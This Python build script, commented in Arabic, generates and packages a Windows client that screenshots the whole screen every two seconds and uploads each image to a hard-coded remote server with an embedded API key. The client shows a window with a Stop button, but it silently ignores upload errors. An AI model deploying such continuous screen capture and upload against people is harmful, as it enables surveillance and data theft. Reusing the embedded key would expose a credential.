#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Build EXE from Config - v2 - Using py2exe instead of PyInstaller
أداة لبناء EXE مخصص باستخدام py2exe
"""

import os
import sys
import json
import shutil
import subprocess
import tempfile
from pathlib import Path
import io

# ✅ إصلاح مشكلة ترميز الأحرف على Windows
if sys.platform == 'win32':
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8')
    os.environ['PYTHONIOENCODING'] = 'utf-8'

def create_client_script(exe_id, pages, output_dir):
    """إنشاء script العميل المخصص"""
    
    pages_json = json.dumps(pages, ensure_ascii=False, indent=2)
    
    client_code = f'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
ProjectSender Client - Auto Generated
عميل مخصص تم إنشاؤه تلقائياً
"""

import tkinter as tk
from tkinter import ttk, messagebox
import requests
import threading
import json
import os
from datetime import datetime
from PIL import Image, ImageGrab
import time
import uuid
import base64
from pathlib import Path

# ==================== التكوين ====================

SERVER_URL = "https://sender-production-7ee8.up.railway.app"
USER_API_KEY = "skpro_user_aB7cD2eF5gH8iJ3kL6mN9oP4qR1sT5uV"
EXE_ID = "{exe_id}"

PAGES_CONFIG = {pages_json}

# ==================== الواجهة الرسومية ====================

class ScreenshotClient:
    def __init__(self, root):
        self.root = root
        self.root.title("ProjectSender Client")
        self.root.geometry("600x400")
        self.root.configure(bg="#1e1e1e")
        
        self.is_running = True
        self.screenshot_thread = None
        
        self.create_ui()
        self.start_capture()
    
    def create_ui(self):
        """إنشاء الواجهة الرسومية"""
        
        # العنوان
        title_label = tk.Label(
            self.root,
            text="📸 ProjectSender Client",
            font=("Arial", 16, "bold"),
            bg="#1e1e1e",
            fg="#00ff88"
        )
        title_label.pack(pady=20)
        
        # معلومات
        info_frame = tk.Frame(self.root, bg="#2d2d2d")
        info_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        tk.Label(info_frame, text="Status:", bg="#2d2d2d", fg="#ffffff", font=("Arial", 11, "bold")).pack(anchor=tk.W, pady=5)
        self.status_label = tk.Label(info_frame, text="🟢 Running", bg="#2d2d2d", fg="#00ff00", font=("Arial", 11))
        self.status_label.pack(anchor=tk.W, pady=5)
        
        tk.Label(info_frame, text="Client ID:", bg="#2d2d2d", fg="#ffffff", font=("Arial", 11, "bold")).pack(anchor=tk.W, pady=5)
        tk.Label(info_frame, text=EXE_ID[:16], bg="#2d2d2d", fg="#00ff88", font=("Arial", 10)).pack(anchor=tk.W, pady=5)
        
        tk.Label(info_frame, text="Pages:", bg="#2d2d2d", fg="#ffffff", font=("Arial", 11, "bold")).pack(anchor=tk.W, pady=5)
        for page in PAGES_CONFIG:
            tk.Label(info_frame, text=f"  - {{page['name']}}: {{page['photo_count']}} photos", bg="#2d2d2d", fg="#00ff88").pack(anchor=tk.W, pady=2)
        
        # أزرار
        buttons_frame = tk.Frame(self.root, bg="#1e1e1e")
        buttons_frame.pack(fill=tk.X, padx=20, pady=20)
        
        stop_btn = tk.Button(
            buttons_frame,
            text="⏹ Stop",
            bg="#cc0000",
            fg="white",
            command=self.stop,
            padx=20,
            pady=10
        )
        stop_btn.pack(side=tk.LEFT, padx=5)
    
    def start_capture(self):
        """بدء التقاط الصور"""
        self.screenshot_thread = threading.Thread(target=self.capture_loop, daemon=True)
        self.screenshot_thread.start()
    
    def capture_loop(self):
        """حلقة التقاط الصور"""
        while self.is_running:
            try:
                for page in PAGES_CONFIG:
                    if not self.is_running:
                        break
                    
                    page_name = page['name']
                    photo_count = page['photo_count']
                    
                    for i in range(photo_count):
                        if not self.is_running:
                            break
                        
                        # التقاط صورة
                        screenshot = ImageGrab.grab()
                        
                        # تحويل إلى base64
                        import io
                        buffer = io.BytesIO()
                        screenshot.save(buffer, format='PNG')
                        image_data = base64.b64encode(buffer.getvalue()).decode()
                        
                        # إرسال إلى الخادم
                        try:
                            headers = {{"X-API-Key": USER_API_KEY}}
                            data = {{
                                "exe_id": EXE_ID,
                                "page": page_name,
                                "image": image_data,
                                "timestamp": datetime.now().isoformat()
                            }}
                            
                            response = requests.post(
                                f"{{SERVER_URL}}/api/upload_screenshot",
                                json=data,
                                headers=headers,
                                timeout=10
                            )
                            
                            if response.status_code != 200:
                                print(f"Failed to upload: {{response.status_code}}")
                        except:
                            pass
                        
                        # انتظر قليلاً
                        time.sleep(2)
            except:
                pass
    
    def stop(self):
        """إيقاف البرنامج"""
        self.is_running = False
        self.root.destroy()

# ==================== البرنامج الرئيسي ====================

if __name__ == "__main__":
    root = tk.Tk()
    app = ScreenshotClient(root)
    root.mainloop()
'''
    
    client_file = os.path.join(output_dir, "client_auto.py")
    with open(client_file, "w", encoding="utf-8") as f:
        f.write(client_code)
    
    print(f"✅ Client script created: {client_file}")
    return client_file

def build_exe_with_py2exe(client_file, exe_id, temp_dir, output_file):
    """بناء EXE باستخدام py2exe"""
    
    # التحقق من py2exe
    check_py2exe = subprocess.run(
        [sys.executable, "-m", "pip", "show", "py2exe"],
        capture_output=True,
        text=True
    )
    
    if check_py2exe.returncode != 0:
        print("⚠️  py2exe not found. Installing...")
        install_result = subprocess.run(
            [sys.executable, "-m", "pip", "install", "py2exe"],
            capture_output=True,
            text=True
        )
        if install_result.returncode != 0:
            print(f"❌ Failed to install py2exe")
            return False
        print("✅ py2exe installed successfully")
    
    # إنشاء setup.py
    setup_py = f'''
from py2exe import setup
import py2exe

setup(
    console=['{client_file}'],
    options={{
        'py2exe': {{
            'packages': ['requests', 'PIL'],
            'includes': ['tkinter'],
        }}
    }},
    zipfile=None,
)
'''
    
    setup_file = os.path.join(temp_dir, "setup.py")
    with open(setup_file, "w", encoding="utf-8") as f:
        f.write(setup_py)
    
    print("🔨 Building EXE with py2exe...")
    
    env = os.environ.copy()
    env['PYTHONIOENCODING'] = 'utf-8'
    
    result = subprocess.run(
        [sys.executable, setup_file, "py2exe"],
        cwd=temp_dir,
        capture_output=True,
        text=True,
        env=env
    )
    
    if result.returncode != 0:
        print(f"❌ Build failed")
        if result.stderr:
            print(f"Error: {result.stderr}")
        if result.stdout:
            print(f"Output: {result.stdout}")
        return False
    
    # البحث عن EXE
    dist_path = os.path.join(temp_dir, "dist")
    if os.path.exists(dist_path):
        for file in os.listdir(dist_path):
            if file.endswith('.exe'):
                exe_path = os.path.join(dist_path, file)
                shutil.copy(exe_path, output_file)
                print(f"✅ EXE created: {output_file}")
                return True
    
    print(f"❌ EXE not found in dist folder")
    return False

def build_exe_simple(client_file, exe_id, temp_dir, output_file):
    """بناء EXE بطريقة بسيطة - نسخ الملف مباشرة"""
    
    print("📦 Creating simple executable wrapper...")
    
    # إنشاء batch file
    batch_content = f'''@echo off
python "{client_file}" %*
'''
    
    batch_file = output_file.replace('.exe', '.bat')
    with open(batch_file, "w", encoding="utf-8") as f:
        f.write(batch_content)
    
    print(f"✅ Batch file created: {batch_file}")
    
    # محاولة تحويل batch إلى exe باستخدام iexpress (Windows built-in)
    try:
        # إنشاء SED file لـ iexpress
        sed_content = f'''[Version]
Class=IEXPRESS
SEDVersion=3
[Options]
PackagePurpose=InstallApp
ShowInstallProgramWindow=1
HideExtractAnimation=1
UseLongFileName=1
InsideCompressed=0
CAB_FixedSize=0
CAB_ResvCodeSigning=0
RebootMode=N
InstallationType=0
TargetName={output_file}
FriendlyName=ProjectSender Client
AppLaunched=cmd.exe /c "{batch_file}"
PostInstallCmd=<None>
AdminQuietInstCmd=<None>
UserQuietInstCmd=<None>
SourceFiles=SourceFiles
[Strings]
InstallPrompt=
DisplayLicense=
FinishMessage=
TargetPlatform=0
[SourceFiles]
SourceFiles0={temp_dir}
[SourceFiles0]
{os.path.basename(batch_file)}=
'''
        
        sed_file = os.path.join(temp_dir, "package.sed")
        with open(sed_file, "w", encoding="utf-8") as f:
            f.write(sed_content)
        
        # تشغيل iexpress
        result = subprocess.run(
            ["iexpress", "/N", "/Q", sed_file],
            capture_output=True,
            timeout=30
        )
        
        if os.path.exists(output_file):
            print(f"✅ EXE created with iexpress: {output_file}")
            return True
    except:
        pass
    
    # إذا فشل iexpress، نسخ الملف مباشرة
    shutil.copy(client_file, output_file.replace('.exe', '.py'))
    print(f"✅ Python file created: {output_file.replace('.exe', '.py')}")
    print("⚠️  Note: Run with: python client.py")
    
    return True

def build_exe(exe_id, pages, output_file):
    """بناء EXE"""
    
    with tempfile.TemporaryDirectory() as temp_dir:
        print(f"📁 Temp directory: {temp_dir}")
        
        # إنشاء client script
        client_file = create_client_script(exe_id, pages, temp_dir)
        
        # محاولة البناء بـ py2exe أولاً
        print("\n🔨 Attempting to build with py2exe...")
        if build_exe_with_py2exe(client_file, exe_id, temp_dir, output_file):
            return True
        
        print("\n⚠️  py2exe failed. Trying simple method...")
        if build_exe_simple(client_file, exe_id, temp_dir, output_file):
            return True
        
        print("\n❌ All build methods failed")
        return False

def main():
    """البرنامج الرئيسي"""
    
    if len(sys.argv) < 3:
        print("Usage: python build_exe_from_config_v2.py <exe_id> <output_file>")
        sys.exit(1)
    
    exe_id = sys.argv[1]
    output_file = sys.argv[2]
    
    print(f"🔨 Building EXE for {exe_id}")
    print(f"📁 Output: {output_file}")
    
    # صفحات افتراضية
    pages = [
        {"name": "Default", "photo_count": 50}
    ]
    
    if build_exe(exe_id, pages, output_file):
        print(f"\n✅ Build completed successfully!")
        sys.exit(0)
    else:
        print(f"\n❌ Build failed!")
        sys.exit(1)

if __name__ == "__main__":
    main()
